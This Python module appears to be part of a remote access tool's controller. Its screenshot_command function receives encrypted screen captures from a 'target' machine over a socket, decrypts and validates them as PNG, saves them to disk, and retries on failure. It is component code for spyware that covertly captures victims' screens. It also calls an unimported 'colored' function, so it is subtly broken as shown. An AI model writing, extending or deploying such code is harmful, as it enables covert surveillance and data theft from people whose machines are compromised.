from components.networking import reliable_recieve, process_and_check_recieved_data, clear_socket_buffer
from components.ingestor import createfile_nocollision
import time
from components.logging import log_activity

def screenshot_command(client_output, conn_obj):
    random_image_filename = createfile_nocollision("screenshot_data", ".png")
    
    # Required variables
    original_timeout = conn_obj.gettimeout()
    attempt = 0
    max_attempts = 3

    while attempt < max_attempts:
        try:
            if client_output is None:
                log_activity("The size of the decrypted data received is invalid. Please check your input and try the command again.", "error")
                raise ValueError("Decrypted size is received invalid, please try the command again")
            
            # Get size and recieve bytes
            data_size = int(client_output.decode().strip())
            received_data = reliable_recieve(conn_obj, data_size)

            # Decyrpt data
            decrypted_data = process_and_check_recieved_data(received_data, data_size)
            if "Failed" in decrypted_data:
                print(f"[!] An error has occured! {decrypted_data}")
                break

            # Check if the decrypted data starts with PNG signature
            if not decrypted_data.startswith(b'\x89PNG\r\n\x1a\n'):
                log_activity(f"Decrypted data does not start with a PNG signature ({decrypted_data[:10]}). Try again in a little moment.", "error")
                raise ValueError("Decrypted data does not start with PNG signature")

            # Save the decrypted image data to a file
            with open(random_image_filename, 'wb') as image_file:
                image_file.write(decrypted_data)

            log_activity(f"Screenshot {random_image_filename} has been saved in current program directory.", "info")
            return colored(f"[+] Screenshot image has been saved as {random_image_filename}", "green")

        except Exception as e:
            attempt += 1
            log_activity(f"Error when capturing screenshot ({e}). Retrying image capture on target, attempt {attempt}/{max_attempts}", "error")
            print(colored(f"[-] Error when capturing screenshot. Retrying image capture on target, attempt {attempt}/{max_attempts} . . .", "red"))
            time.sleep(2)  # Wait for 2 seconds before retrying

        finally:
            conn_obj.settimeout(original_timeout)  # Reset the timeout to original
            clear_socket_buffer(conn_obj)  # Clear the buffer to prevent leakage

    return colored("[-] Failed to capture screenshot after several attempts.", "red")